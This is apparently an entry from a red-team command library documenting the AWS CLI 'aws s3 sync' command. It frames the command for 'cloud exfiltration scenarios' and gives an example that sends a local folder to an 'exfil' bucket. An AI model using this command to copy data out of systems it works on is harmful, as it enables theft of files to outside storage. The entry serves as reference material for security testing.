---
id: 4ab0c904-04f7-4c62-9ac4-e8d63b638374
name: aws-s3-sync-local-folder
type: command
executor: bash
data: |
  aws s3 sync $FOLDER s3://$AWS_S3_BUCKET
output: null
created_at: '2020-07-31T04:25:33.754089+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Cloud
tags:
  - AWS
  - S3
  - Sync
verified: true
validated: true
---

# aws-s3-sync-local-folder

## Command

```bash
aws s3 sync $FOLDER s3://$AWS_S3_BUCKET
```

## Description

This command synchronizes a local folder to an S3 bucket, uploading only new or modified files based on timestamps. Use it for initial data transfers in cloud exfiltration scenarios where regional defaults suffice.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $FOLDER | Path to the local folder to sync from | Yes |
| $AWS_S3_BUCKET | Name of the target S3 bucket | Yes |

## Examples

### Basic Usage

```bash
aws s3 sync /path/to/local/folder s3://my-exfil-bucket
```

### Advanced Usage

```bash
aws s3 sync /path/to/folder s3://my-bucket --exclude "*.tmp"
```

## Expected Output

Progress indicators for uploads:

```
upload: local-folder/file1.txt to s3://my-bucket/file1.txt
upload: local-folder/subdir/file2.txt to s3://my-bucket/subdir/file2.txt
Completed 2 part(s) with ... file(s) remaining
```

## Related

- [[procedures/AWS-Sync-Folder-with-S3-Bucket]]
- [[commands/aws-s3-sync-specify-region]]
